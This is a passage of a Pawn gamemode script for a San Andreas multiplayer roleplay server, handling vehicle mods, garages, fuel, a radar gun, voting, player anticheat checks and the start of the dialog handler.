        GameTextForPlayer(playerid, "~w~You can withdraw by ~n~typing ~b~/withdraw", 2000, 5);
    }
 	if(pickupid == DepositPickup)
    {
        GameTextForPlayer(playerid, "~w~You can withdraw by ~n~typing ~b~/deposit", 2000, 5);
    }
	if(pickupid == VIPPickup)
    {
        GameTextForPlayer(playerid, "~w~You can enter this building by ~n~typing ~b~/enter", 2000, 5);
    }
    if(pickupid == CityHallPickup)
    {
		GameTextForPlayer(playerid, "~w~You can enter this building by ~n~typing ~b~/enter", 2000, 5);
	}
	if(pickupid == GymPickup)
	{
		GameTextForPlayer(playerid, "~w~You can enter this building by ~n~typing ~b~/enter", 2000, 5);
	}
	if(pickupid == DrugPickup)
	{
		GameTextForPlayer(playerid, "~w~You can enter this building by ~n~typing ~b~/enter", 2000, 5);
	}
	if(pickupid == cocainePickup)
	{
		GameTextForPlayer(playerid, "~w~You can enter this building by ~n~typing ~b~/enter", 2000, 5);
	}
	if(pickupid == FactoryPickup)
	{
		GameTextForPlayer(playerid, "~w~You can enter this building by ~n~typing ~b~/enter", 2000, 5);
	}
	if(pickupid == DMVPickup)
	{
		GameTextForPlayer(playerid, "~w~You can enter this building by ~n~typing ~b~/enter", 2000, 5);
	}
	if(pickupid == SaintsPickup)
	{
		GameTextForPlayer(playerid, "~w~You can enter this building by ~n~typing ~b~/enter", 2000, 5);
	}
	if(pickupid == BankPickup)
	{
		GameTextForPlayer(playerid, "~w~You can enter this building by ~n~typing ~b~/enter", 2000, 5);
	}
	return 1;
}

public OnVehicleMod(playerid, vehicleid, componentid)
{
	if(vehicleid == Player[playerid][pVeh])
	{
		for(new i=0; i<14; i++)
		{
		    Player[playerid][pVehMod][i] = GetVehicleComponentInSlot(Player[playerid][pVeh], i);
		}
	}
	else if(vehicleid == Player[playerid][pVVeh])
	{
		for(new i=0; i<14; i++)
		{
		    Player[playerid][pVVehMod][i] = GetVehicleComponentInSlot(Player[playerid][pVVeh], i);
		}
	}
	else if(vehicleid == Player[playerid][pVVVeh])
	{
		for(new i=0; i<14; i++)
		{
		    Player[playerid][pVVVehMod][i] = GetVehicleComponentInSlot(Player[playerid][pVVVeh], i);
		}
	}
	else if(vehicleid == Player[playerid][pVVVVeh])
	{
		for(new i=0; i<14; i++)
		{
		    Player[playerid][pVVVVehMod][i] = GetVehicleComponentInSlot(Player[playerid][pVVVVeh], i);
		}
	}
	return 1;
}
public OnVehiclePaintjob(playerid, vehicleid, paintjobid)
{
	if(vehicleid == Player[playerid][pVeh])
	{
		Player[playerid][vPJ] = paintjobid;
	}
	else if(vehicleid == Player[playerid][pVVeh])
	{
		Player[playerid][vVPJ] = paintjobid;
	}
	else if(vehicleid == Player[playerid][pVVVeh])
	{
		Player[playerid][vVVPJ] = paintjobid;
	}
	else if(vehicleid == Player[playerid][pVVVVeh])
	{
		Player[playerid][vVVVPJ] = paintjobid;
	}
	return 1;
}

public OnVehicleRespray(playerid, vehicleid, color1, color2)
{
    if(vehicleid == Player[playerid][pVeh])
	{
		Player[playerid][vC1] = color1;
		Player[playerid][vC2] = color2;
		for(new i=0; i<14; i++)
		{
		    Player[playerid][pVehMod][i] = GetVehicleComponentInSlot(Player[playerid][pVeh], i);
		}
	}
	else if(vehicleid == Player[playerid][pVVeh])
	{
		Player[playerid][vVC1] = color1;
		Player[playerid][vVC2] = color2;
		for(new i=0; i<14; i++)
		{
		    Player[playerid][pVVehMod][i] = GetVehicleComponentInSlot(Player[playerid][pVVeh], i);
		}
	}
	else if(vehicleid == Player[playerid][pVVVeh])
	{
		Player[playerid][vVVC1] = color1;
		Player[playerid][vVVC2] = color2;
		for(new i=0; i<14; i++)
		{
		    Player[playerid][pVVVehMod][i] = GetVehicleComponentInSlot(Player[playerid][pVVVeh], i);
		}
	}
	else if(vehicleid == Player[playerid][pVVVVeh])
	{
		Player[playerid][vVVVC1] = color1;
		Player[playerid][vVVVC2] = color2;
		for(new i=0; i<14; i++)
		{
		    Player[playerid][pVVVVehMod][i] = GetVehicleComponentInSlot(Player[playerid][pVVVVeh], i);
		}
	}
	return 1;
}

public OnPlayerSelectedMenuRow(playerid, row)
{
	return 1;
}

public OnPlayerExitedMenu(playerid)
{
	return 1;
}

public OnPlayerInteriorChange(playerid, newinteriorid, oldinteriorid)
{
	foreach(Player, i)
	{
		if(Specid[i] == playerid)
		{
		    SetPlayerInterior(i, newinteriorid);
		}
	}
	return 1;
}

public OnPlayerKeyStateChange(playerid, newkeys, oldkeys)
{
    if(Player[playerid][pDead])
    {
        TogglePlayerControllable(playerid, 0);
        ApplyAnimation(playerid,"KNIFE","KILL_Knife_Ped_Die",4.1,0,0,0,1,0,0);
        return 1;
    }
    if(gPlayerUsingLoopingAnim[playerid])
	{
		if(IsKeyJustDown(KEY_SPRINT,newkeys,oldkeys))
		{
            if(Player[playerid][pDead])
            {
               TogglePlayerControllable(playerid, 0);
               ApplyAnimation(playerid,"KNIFE","KILL_Knife_Ped_Die",4.1,0,0,0,1,0,0);
               return 1;
            }
            else
            {
	    	    StopLoopingAnim(playerid);
	      		TextDrawHideForPlayer(playerid,txtAnimHelper);
	     		animation[playerid] = 0;
	     		ClearAnimations(playerid);
	     	}
	   	}
	  	return 1;
	}
	if(newkeys == 2)
    {
        for(new idx=1; idx<MAX_GARAGES; idx++) // Dynamic Garages
		{
		    new string[256], done;
	        if(IsPlayerInRangeOfPoint(playerid, 4, GarageInfo[idx][gX], GarageInfo[idx][gY], GarageInfo[idx][gZ]))
		    {
                if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GRAD2, "You can't enter the garage without a car.");
	    	    if(GetPlayerVehicleID(playerid) != Player[playerid][pVeh] && GetPlayerVehicleID(playerid) != Player[playerid][pVVeh] && GetPlayerVehicleID(playerid) != Player[playerid][pVVVeh] && GetPlayerVehicleID(playerid) != Player[playerid][pVVVVeh]) return SendClientMessage(playerid, COLOR_GRAD2, "You are not in your vehicle.");
		        TogglePlayerControllable(playerid, 0);
  		    	SetTimerEx("EnterExitTimer", 5000, false, "i", playerid);
			    if(!GarageInfo[idx][gStatus] && Player[playerid][pGarage] != idx) return SendClientMessage(playerid, COLOR_GRAD2, "This garage is locked.");
			    if(IsPlayerInAnyVehicle(playerid) && GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
		        format(string, sizeof(string), "* %s lifts the door and enters the garage.", GetName(playerid));
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
		        SetPlayerVirtualWorld(playerid, idx+200);
				if(GarageInfo[idx][gLevel] == 1)
				{
					if(IsPlayerInVehicle(playerid, Player[playerid][pVeh]))
					{
					    SetVehiclePos(Player[playerid][pVeh], 1342.0830,-1546.7599,10037.3174);
				        SetCameraBehindPlayer(playerid);
				        SetVehicleVirtualWorld(Player[playerid][pVeh], idx+200);
					}
					else if(IsPlayerInVehicle(playerid, Player[playerid][pVVeh]))
					{
					    SetVehiclePos(Player[playerid][pVVeh], 1342.0830,-1546.7599,10037.3174);
				        SetCameraBehindPlayer(playerid);
				        SetVehicleVirtualWorld(Player[playerid][pVVeh], idx+200);
					}
					else if(IsPlayerInVehicle(playerid, Player[playerid][pVVVeh]))
					{
					    SetVehiclePos(Player[playerid][pVVVeh], 1342.0830,-1546.7599,10037.3174);
				        SetCameraBehindPlayer(playerid);
				        SetVehicleVirtualWorld(Player[playerid][pVVVeh], idx+200);
					}
					else if(IsPlayerInVehicle(playerid, Player[playerid][pVVVVeh]))
					{
					    SetVehiclePos(Player[playerid][pVVVVeh], 1342.0830,-1546.7599,10037.3174);
				        SetCameraBehindPlayer(playerid);
				        SetVehicleVirtualWorld(Player[playerid][pVVVVeh], idx+200);
					}
					else
					{
				 		SendClientMessage(playerid, COLOR_GRAD2, "You are not in one of your owned vehicles");
				 		return 1;
					}
				}
			}
			if(IsPlayerInRangeOfPoint(playerid, 20, 1342.0830,-1546.7599,10037.3174)) // Garages
		    {
                //if(GetPlayerVehicleID(playerid) != Player[playerid][pVeh] && GetPlayerVehicleID(playerid) != Player[playerid][pVVeh] && GetPlayerVehicleID(playerid) != Player[playerid][pVVVeh] && GetPlayerVehicleID(playerid) != Player[playerid][pVVVVeh]) return SendClientMessage(playerid, COLOR_GRAD2, "You are not in your vehicle.");
		        idx = GetPlayerVirtualWorld(playerid)-200;
		        if(!done && idx < MAX_GARAGES && GarageInfo[idx][gLevel])
				{
					format(string, sizeof(string), "* %s lifts the door up and exits the garage.", GetName(playerid));
					SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
					if(IsPlayerInAnyVehicle(playerid) && GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
					{
					    if(IsPlayerInVehicle(playerid, Player[playerid][pVeh]))
		    			{
				    	    SetVehiclePos(Player[playerid][pVeh], GarageInfo[idx][gX], GarageInfo[idx][gY], GarageInfo[idx][gZ]);
			    	        SetCameraBehindPlayer(playerid);
				            SetVehicleVirtualWorld(Player[playerid][pVeh], 0);
				            SetPlayerPos(playerid, GarageInfo[idx][gX], GarageInfo[idx][gY], GarageInfo[idx][gZ]);
			    		    SetCameraBehindPlayer(playerid);
			    		    SetPlayerVirtualWorld(playerid, 0);
				    	    PutPlayerInVehicle(playerid, Player[playerid][pVeh], 0);
		    			}
	    				if(IsPlayerInVehicle(playerid, Player[playerid][pVVeh]))
		    			{
		    			    SetVehiclePos(Player[playerid][pVVeh], GarageInfo[idx][gX], GarageInfo[idx][gY], GarageInfo[idx][gZ]);
			    	        SetCameraBehindPlayer(playerid);
				            SetVehicleVirtualWorld(Player[playerid][pVVeh], 0);
				            SetPlayerPos(playerid, GarageInfo[idx][gX], GarageInfo[idx][gY], GarageInfo[idx][gZ]);
			    		    SetCameraBehindPlayer(playerid);
			    		    SetPlayerVirtualWorld(playerid, 0);
				    	    PutPlayerInVehicle(playerid, Player[playerid][pVVeh], 0);
	    				}
		    			if(IsPlayerInVehicle(playerid, Player[playerid][pVVVeh]))
		    			{
			    		    SetVehiclePos(Player[playerid][pVVVeh], GarageInfo[idx][gX], GarageInfo[idx][gY], GarageInfo[idx][gZ]);
			    	        SetCameraBehindPlayer(playerid);
				            SetVehicleVirtualWorld(Player[playerid][pVVVeh], 0);
				            SetPlayerPos(playerid, GarageInfo[idx][gX], GarageInfo[idx][gY], GarageInfo[idx][gZ]);
			    		    SetCameraBehindPlayer(playerid);
			    		    SetPlayerVirtualWorld(playerid, 0);
				    	    PutPlayerInVehicle(playerid, Player[playerid][pVVVeh], 0);
			    		}
				    	if(IsPlayerInVehicle(playerid, Player[playerid][pVVVVeh]))
			    		{
			    		    SetVehiclePos(Player[playerid][pVVVVeh], GarageInfo[idx][gX], GarageInfo[idx][gY], GarageInfo[idx][gZ]);
			    	        SetCameraBehindPlayer(playerid);
				            SetVehicleVirtualWorld(Player[playerid][pVVVVeh], 0);
				            SetPlayerPos(playerid, GarageInfo[idx][gX], GarageInfo[idx][gY], GarageInfo[idx][gZ]);
			    		    SetCameraBehindPlayer(playerid);
			    		    SetPlayerVirtualWorld(playerid, 0);
				    	    PutPlayerInVehicle(playerid, Player[playerid][pVVVVeh], 0);
			    		}
					}
     				done = 1;
	        	}
	        	return 1;
			}
		}
	}
	if((newkeys & KEY_FIRE) && Player[playerid][pRadarGun] == 1)
	{
	    if(GetPlayerWeapon(playerid) == 43)
		{
		    new Float:x,Float:y,Float:z;
			foreach(Player, i)
			{
			    if(IsPlayerStreamedIn(i, playerid))
			    {
                    new speed = GetVehicleSpeed(GetPlayerVehicleID(i), 0);
				    GetPlayerPos(i,x,y,z);
				    if(IsPlayerAimingAt(playerid,x,y,z,10))
				    {
						new string[68];
						format(string, sizeof(string), "~n~~n~~n~~n~~n~~n~~b~License Plate: ~w~%d~n~~b~Speed: ~w~%.0f MPH", GetPlayerVehicleID(i), speed);
						GameTextForPlayer(playerid, string,3500, 3);
						format(string, sizeof(string), "License Plate: %d. Speed: %.0f MPH", GetPlayerVehicleID(i), speed);
						SendClientMessage(playerid, COLOR_GRAD2, string);
						return 1;
					}
				}
		    }
		}
	}
	if (((newkeys & KEY_WALK && newkeys & KEY_UP) || (newkeys & KEY_WALK && newkeys & KEY_DOWN) || (newkeys & KEY_WALK && newkeys & KEY_LEFT) || (newkeys & KEY_WALK && newkeys & KEY_RIGHT))
		|| ((oldkeys & KEY_WALK && newkeys & KEY_UP) || (oldkeys & KEY_WALK && newkeys & KEY_DOWN) || (oldkeys & KEY_WALK && newkeys & KEY_LEFT) || (oldkeys & KEY_WALK && newkeys & KEY_RIGHT))
		|| ((newkeys & KEY_WALK && oldkeys & KEY_UP) || (newkeys & KEY_WALK && oldkeys & KEY_DOWN) || (newkeys & KEY_WALK && oldkeys & KEY_LEFT) || (newkeys & KEY_WALK && oldkeys & KEY_RIGHT))
		&& GetPlayerState(playerid) == PLAYER_STATE_ONFOOT) {
			walktime[playerid] = SetTimerEx("WalkAnim",200,0,"d",playerid);
	}
	if(newkeys == KEY_YES)
	{
	    if(VoteStarted == 1)
	    {
	        if(HasVoted[playerid] > 0) return SendClientMessage(playerid, COLOR_GRAD2, "You have already voted.");
	        SendClientMessage(playerid, COLOR_LIGHTRED, "** You have voted YES for the current vote.");
	        VoteYES ++;
	        HasVoted[playerid] = 1;
		}
	 }
	 if(newkeys == KEY_NO)
	 {
	    if(VoteStarted == 1)
	    {
	        if(HasVoted[playerid] > 0) return SendClientMessage(playerid, COLOR_GRAD2, "You have already voted.");
	        SendClientMessage(playerid, COLOR_LIGHTRED, "** You have voted NO for the current vote.");
	        VoteNO ++;
	        HasVoted[playerid] = 1;
		}
	}
	/*if(newkeys == KEY_FIRE)
    {
        new string[256], Float:Pos[3];
        if(IsHoldingBullets(playerid) && GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
    	{
      		SetPlayerPos(playerid, Pos[0], Pos[1], Pos[2]);
	        SetPlayerPos(playerid, Pos[0], Pos[1], Pos[2]+5);
	        format(string, sizeof(string), "** Don't try to Driver Drive By. [DDB]");
	        SendClientMessage(playerid, COLOR_ORANGE, string);
      		return 1;
    	}
  	}*/
	if(GetPlayerSpecialAction(playerid) == SPECIAL_ACTION_DRINK_SPRUNK || GetPlayerSpecialAction(playerid) == SPECIAL_ACTION_DRINK_WINE || GetPlayerSpecialAction(playerid) == SPECIAL_ACTION_DRINK_BEER)
	{
	    if(newkeys == KEY_FIRE)
	    {
			if(!NoSprunk[playerid])
			{
                new Float:H;
                if(DayUnbreakable == 1)
                {
	      		    GetPlayerHealth(playerid, H);
		    	    SetPlayerHealth(playerid, H+5);
		    		GetPlayerHealth(playerid, H);
			    	if(H > 150) SetPlayerHealth(playerid, 150);
			    }
			    else
			    {
                    GetPlayerHealth(playerid, H);
		    	    SetPlayerHealth(playerid, H+5);
		    		GetPlayerHealth(playerid, H);
			    	if(H > 100) SetPlayerHealth(playerid, 100);
			    }
				NoSprunk[playerid] = 1;
				SetTimerEx("SprunkTimer", 1800, false, "d", playerid);
			}

		}
	}


	//if(newkeys & KEY_CROUCH || (oldkeys & KEY_CROUCH)) return 1;

	else if(((newkeys & KEY_FIRE) && (newkeys & KEY_HANDBRAKE) && !((newkeys & KEY_SPRINT) || (newkeys & KEY_JUMP))) ||
	(newkeys & KEY_FIRE) && !((newkeys & KEY_SPRINT) || (newkeys & KEY_JUMP)) ||
	(NotMoving[playerid] && (newkeys & KEY_FIRE) && (newkeys & KEY_HANDBRAKE)) ||
	(NotMoving[playerid] && (newkeys & KEY_FIRE)) ||
	(newkeys & KEY_FIRE) && (oldkeys & KEY_CROUCH) && !((oldkeys & KEY_FIRE) || (newkeys & KEY_HANDBRAKE)) ||
	(oldkeys & KEY_FIRE) && (newkeys & KEY_CROUCH) && !((newkeys & KEY_FIRE) || (newkeys & KEY_HANDBRAKE)) ) {
		SetTimerEx("CrouchCheck", 3000, 0, "d", playerid);
		CheckCrouch[playerid] = 1;
		WeaponID[playerid] = GetPlayerWeapon(playerid);
		Ammo[playerid][GetPlayerWeapon(playerid)] = GetPlayerAmmo(playerid);
		return 1;
	}
  /*  switch(newkeys)
	{
	    case 65536:
		{
		    if(GetPVarInt(playerid, "SettingGraffiti") == 1)
			{
			    if(KeyPressed[playerid] == 1) return 1;
				if(KeyForPress[playerid] == 1)
				{
            		KeyPressed[playerid] = 1;
            		PlayerTextDrawHide(playerid, ClickTD[playerid]);
				}
				else
				{
				    GraffitiFailed(playerid);
				}
			}
		}
	    case 131072:
		{
			if(GetPVarInt(playerid, "SettingGraffiti") == 1)
			{
			    if(KeyPressed[playerid] == 1) return 1;
				if(KeyForPress[playerid] == 3)
				{
            		KeyPressed[playerid] = 1;
            		PlayerTextDrawHide(playerid, ClickTD[playerid]);
				}
				else
				{
				    GraffitiFailed(playerid);
				}
			}
		}
		case 262144:
		{
			if(GetPVarInt(playerid, "SettingGraffiti") == 1)
			{
			    if(KeyPressed[playerid] == 1) return 1;
				if(KeyForPress[playerid] == 2)
				{
            		KeyPressed[playerid] = 1;
            		PlayerTextDrawHide(playerid, ClickTD[playerid]);
				}
				else
				{
				    GraffitiFailed(playerid);
				}
			}
		}
	}*/
	return 1;
}

public OnRconLoginAttempt(ip[], password[], success)
{
/*	if(success)
	{
		 new string[128];
    	 foreach(Player, i)
		 {
			if(!Player[i][pAdmin])
			{
        	    format(string, sizeof(string), "AdmCmd: %s has been banned by "ANTIHACK", reason: Rcon Login Attempt", GetName(i));
            	SendClientMessageToAll(COLOR_LIGHTRED, string);
            	format(string, sizeof(string), "AdmCmd: %s has been banned by "ANTIHACK" (%s), reason: Rcon Login Attempt", GetName(i), RPIP(i));
            	Log("Log/Admins/ban.log", string);
               	// Banning
            	Player[i][pBanned] = 1;
            	// Banreason
            	new file[32];
            	format(file, sizeof(file), "Accounts/%s.ini", GetAccountName(i));
            	dini_Set(file, "BanReason", "Rcon Login Attempt");
             	dini_Set(file, "BannedBy", "ANTIHACK");
            	// BanList
             	AddBan(i);
            	Kick(i);
            }
        }
    }
    if(!success)
	{
		 new string[128];
    	 foreach(Player, i)
		 {
			if(!Player[i][pAdmin])
			{
        	    format(string, sizeof(string), "AdmCmd: %s has been banned by "ANTIHACK", reason: Rcon Login Attempt", GetName(i));
            	SendClientMessageToAll(COLOR_LIGHTRED, string);
            	format(string, sizeof(string), "AdmCmd: %s has been banned by "ANTIHACK" (%s), reason: Rcon Login Attempt", GetName(i), RPIP(i));
            	Log("Log/Admins/ban.log", string);
               	// Banning
            	Player[i][pBanned] = 1;
            	// Banreason
            	new file[32];
            	format(file, sizeof(file), "Accounts/%s.ini", GetAccountName(i));
            	dini_Set(file, "BanReason", "Rcon Login Attempt");
             	dini_Set(file, "BannedBy", "ANTIHACK");
            	// BanList
             	AddBan(i);
            	Kick(i);
            }
        }
    }*/
	return 1;
}

public OnPlayerUpdate(playerid)
{
	if(IsPlayerConnected(playerid) && Logged(playerid))
	{
	    // Spikes
	    if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
	    {
	        if(!IsACop(playerid) && !IsFBI(playerid) && !IsDOC(playerid))
	  	    {
		        for(new i = 0; i < sizeof(SpikeInfo); i++)
		  	    {
		  	        if(IsPlayerInRangeOfPoint(playerid, 3.0, SpikeInfo[i][sX], SpikeInfo[i][sY], SpikeInfo[i][sZ]))
		            {
		  	            if(SpikeInfo[i][sCreated] == 1)
		  	            {
		  	                new panels, doors, lights, tires;
		  	                new carid = GetPlayerVehicleID(playerid);
				            GetVehicleDamageStatus(carid, panels, doors, lights, tires);
				            tires = encode_tires(1, 1, 1, 1);
				            UpdateVehicleDamageStatus(carid, panels, doors, lights, tires);
		  	            }
		  	        }
		  	    }
			}
	  	}
	    // Fuel
	    new vehicleid = GetPlayerVehicleID(playerid);
	    if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER && Fuel[vehicleid] <= 0)
	    {
	    	new engine, lights, alarm, doors, bonnet, boot, objective, string[128];
			GetVehicleParamsEx(vehicleid, engine, lights, alarm, doors, bonnet, boot, objective);
			if(engine)
			{
				SetVehicleParamsEx(vehicleid, 0, 0, 0, 0, 0, 0, 0);
				if(GetPlayerVehicleID(playerid) == Player[playerid][pVeh])
			    {SetVehicleParamsEx(vehicleid, 0, 0, 0, Player[playerid][vLocked], 0, 0, 0);}
			    if(GetPlayerVehicleID(playerid) == Player[playerid][pVVeh])
			    {SetVehicleParamsEx(vehicleid, 0, 0, 0, Player[playerid][vVLocked], 0, 0, 0);}
			    if(GetPlayerVehicleID(playerid) == Player[playerid][pVVVeh])
			    {SetVehicleParamsEx(vehicleid, 0, 0, 0, Player[playerid][vVVLocked], 0, 0, 0);}
			    if(GetPlayerVehicleID(playerid) == Player[playerid][pVVVVeh])
			    {SetVehicleParamsEx(vehicleid, 0, 0, 0, Player[playerid][vVVVLocked], 0, 0, 0);}
			    format(string, sizeof(string), "* %s's vehicle stops as it has no fuel in its tank.", GetName(playerid));
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
			}
	    }
	    // Drag
	    if(Dragged[playerid] != -1)
	    {
			new user = Dragged[playerid];
			new Float:pos[3];
			GetPlayerPos(user, pos[0], pos[1], pos[2]);
			SetPlayerPos(playerid, pos[0]+0.5, pos[1]+0.5, pos[2]);
			SetPlayerInterior(playerid, GetPlayerInterior(user));
			SetPlayerVirtualWorld(playerid, GetPlayerVirtualWorld(user));
	    }

	    // Alt-Tab detection
		AltTabbed[playerid] = 0;
	    // Ping Update
	    /*if(GetPlayerState(playerid) == PLAYER_STATE_SPECTATING)
	    {
	        new string[128];
            format(string,sizeof(string),"~n~~n~~n~~n~~n~~n~~n~~n~~r~%s's Ping: ~w~%d", GetName(Specid[playerid]), GetPlayerPing(Specid[playerid]));
			GameTextForPlayer(playerid, string,1000, 3);
	    }*/
	    // Money Anticheat
		if(GetPlayerMoney(playerid) != Player[playerid][pMoney])
		{
			ResetPlayerMoney(playerid);
			GivePlayerMoney(playerid, Player[playerid][pMoney]);
		}
		// SpeedCheck
		if(IsPlayerInAnyVehicle(playerid) && GetPlayerState(playerid) == PLAYER_STATE_DRIVER && !IsPlayerAnAdmin(playerid))
		{
			new speed = GetVehicleSpeed(GetPlayerVehicleID(playerid), 0);
			if(speed > 205 && GetVehicleModel(GetPlayerVehicleID(playerid)) != 519 && GetVehicleModel(GetPlayerVehicleID(playerid)) != 553 || speed > 240)
			{
			    new string[128];
				format(string, sizeof(string), "AdminWarning: %s might be using speed hacks (%d MPH)", GetName(playerid), speed);
				SendAdminMessage(COLOR_ADMWARN,  string);
			}
		}
	}
        if(GetTickCount() - armedbody_pTick[playerid] > 113){ //prefix check itter
                new
                        weaponid[13],weaponammo[13],pArmedWeapon;
                pArmedWeapon = GetPlayerWeapon(playerid);
                GetPlayerWeaponData(playerid,1,weaponid[1],weaponammo[1]);
                GetPlayerWeaponData(playerid,2,weaponid[2],weaponammo[2]);
                GetPlayerWeaponData(playerid,4,weaponid[4],weaponammo[4]);
                GetPlayerWeaponData(playerid,5,weaponid[5],weaponammo[5]);
                #if ARMEDBODY_USE_HEAVY_WEAPON
                GetPlayerWeaponData(playerid,7,weaponid[7],weaponammo[7]);
                #endif
                if(weaponid[1] && weaponammo[1] > 0){
                        if(pArmedWeapon != weaponid[1]){
                                if(!IsPlayerAttachedObjectSlotUsed(playerid,0)){
                                        SetPlayerAttachedObject(playerid,0,GetWeaponModel(weaponid[1]),1, 0.199999, -0.139999, 0.030000, 0.500007, -115.000000, 0.000000, 1.000000, 1.000000, 1.000000);
                                }
                        }
                        else {
                                if(IsPlayerAttachedObjectSlotUsed(playerid,0)){
                                        RemovePlayerAttachedObject(playerid,0);
                                }
                        }
                }
                else if(IsPlayerAttachedObjectSlotUsed(playerid,0)){
                        RemovePlayerAttachedObject(playerid,0);
                }
                if(weaponid[2] && weaponammo[2] > 0){
                        if(pArmedWeapon != weaponid[2]){
                                if(!IsPlayerAttachedObjectSlotUsed(playerid,1)){
                                        SetPlayerAttachedObject(playerid,1,GetWeaponModel(weaponid[2]),8, -0.079999, -0.039999, 0.109999, -90.100006, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000);
                                }
                        }
                        else {
                                if(IsPlayerAttachedObjectSlotUsed(playerid,1)){
                                        RemovePlayerAttachedObject(playerid,1);
                                }
                        }
                }
                else if(IsPlayerAttachedObjectSlotUsed(playerid,1)){
                        RemovePlayerAttachedObject(playerid,1);
                }
                if(weaponid[4] && weaponammo[4] > 0){
                        if(pArmedWeapon != weaponid[4]){
                                if(!IsPlayerAttachedObjectSlotUsed(playerid,2)){
                                        SetPlayerAttachedObject(playerid,2,GetWeaponModel(weaponid[4]),7, 0.000000, -0.100000, -0.080000, -95.000000, -10.000000, 0.000000, 1.000000, 1.000000, 1.000000);
                                }
                        }
                        else {
                                if(IsPlayerAttachedObjectSlotUsed(playerid,2)){
                                        RemovePlayerAttachedObject(playerid,2);
                                }
                        }
                }
                else if(IsPlayerAttachedObjectSlotUsed(playerid,2)){
                        RemovePlayerAttachedObject(playerid,2);
                }
                if(weaponid[5] && weaponammo[5] > 0){
                        if(pArmedWeapon != weaponid[5]){
                                if(!IsPlayerAttachedObjectSlotUsed(playerid,3)){
                                        SetPlayerAttachedObject(playerid,3,GetWeaponModel(weaponid[5]),1, 0.200000, -0.119999, -0.059999, 0.000000, 206.000000, 0.000000, 1.000000, 1.000000, 1.000000);
                                }
                        }
                        else {
                                if(IsPlayerAttachedObjectSlotUsed(playerid,3)){
                                        RemovePlayerAttachedObject(playerid,3);
                                }
                        }
                }
                else if(IsPlayerAttachedObjectSlotUsed(playerid,3)){
                        RemovePlayerAttachedObject(playerid,3);
                }
                #if ARMEDBODY_USE_HEAVY_WEAPON
                if(weaponid[7] && weaponammo[7] > 0){
                        if(pArmedWeapon != weaponid[7]){
                                if(!IsPlayerAttachedObjectSlotUsed(playerid,4)){
                                        SetPlayerAttachedObject(playerid,4,GetWeaponModel(weaponid[7]),1,-0.100000, 0.000000, -0.100000, 84.399932, 112.000000, 10.000000, 1.099999, 1.000000, 1.000000);
                                }
                        }
                        else {
                                if(IsPlayerAttachedObjectSlotUsed(playerid,4)){
                                        RemovePlayerAttachedObject(playerid,4);
                                }
                        }
                }
                else if(IsPlayerAttachedObjectSlotUsed(playerid,4)){
                        RemovePlayerAttachedObject(playerid,4);
                }
                #endif
                armedbody_pTick[playerid] = GetTickCount();
        }
	if(Speedo[playerid] && IsPlayerInAnyVehicle(playerid) && GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
	{
	    new string[64], speed = GetVehicleSpeed(GetPlayerVehicleID(playerid), 0);
        format(string, sizeof(string), "Speed: %d", speed);
        TextDrawSetString(SpeedText[playerid], string);
        TextDrawShowForPlayer(playerid, SpeedText[playerid]);
	}
	// Fuel
	if(fMeter[playerid] && IsPlayerInAnyVehicle(playerid) && GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
	{
        new string[128];
        if(Fuel[GetPlayerVehicleID(playerid)] >= 70)
        {
           format(string, sizeof(string), "Fuel: ~g~%d%s", Fuel[GetPlayerVehicleID(playerid)], "%%");
           TextDrawSetString(FuelText[playerid], string);
           TextDrawShowForPlayer(playerid, FuelText[playerid]);
        }
        if(Fuel[GetPlayerVehicleID(playerid)] >= 30 && Fuel[GetPlayerVehicleID(playerid)] <= 69 )
        {
           format(string, sizeof(string), "Fuel: ~y~%d", Fuel[GetPlayerVehicleID(playerid)], "%%");
           TextDrawSetString(FuelText[playerid], string);
           TextDrawShowForPlayer(playerid, FuelText[playerid]);
        }
        if(Fuel[GetPlayerVehicleID(playerid)] >= 0 && Fuel[GetPlayerVehicleID(playerid)] <= 29)
        {
           format(string, sizeof(string), "Fuel: ~r~%d", Fuel[GetPlayerVehicleID(playerid)], "%%");
           TextDrawSetString(FuelText[playerid], string);
           TextDrawShowForPlayer(playerid, FuelText[playerid]);
        }
	}
	return 1;
}

public OnPlayerEditAttachedObject(playerid, response, index, modelid, boneid, Float:fOffsetX, Float:fOffsetY, Float:fOffsetZ, Float:fRotX, Float:fRotY, Float:fRotZ, Float:fScaleX, Float:fScaleY, Float:fScaleZ)
{
	SetPlayerAttachedObject(playerid, index, modelid, boneid, Float:fOffsetX, Float:fOffsetY, Float:fOffsetZ, Float:fRotX, Float:fRotY, Float:fRotZ, Float:fScaleX, Float:fScaleY, Float:fScaleZ);
	Player[playerid][pToyX][index] = fOffsetX;
	Player[playerid][pToyY][index] = fOffsetY;
	Player[playerid][pToyZ][index] = fOffsetZ;
	Player[playerid][pToyRX][index] = fRotX;
	Player[playerid][pToyRY][index] = fRotY;
	Player[playerid][pToyRZ][index] = fRotZ;
    Player[playerid][pToySX][index] = fScaleX;
    Player[playerid][pToySY][index] = fScaleY;
    Player[playerid][pToySZ][index] = fScaleZ;
    return 1;
}

public OnPlayerStreamIn(playerid, forplayerid)
{
	return 1;
}

public OnPlayerStreamOut(playerid, forplayerid)
{
	return 1;
}

public OnVehicleStreamIn(vehicleid, forplayerid)
{
	return 1;
}

public OnVehicleStreamOut(vehicleid, forplayerid)
{
	return 1;
}

public OnPlayerClickPlayer(playerid, clickedplayerid, source)
{
	return 1;
}

public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
{
    if(strfind(inputtext, "%", true) != -1)
	{
			Kick(playerid);
			return 0;
	}
    new vehid = GetPlayerVehicleID(playerid);
	new vehmd = GetVehicleModel(GetPlayerVehicleID(playerid));
    if(dialogid == 1) // Register
	{
	    if(response)
	    {
            if(strlen(inputtext) < 4)
	        {
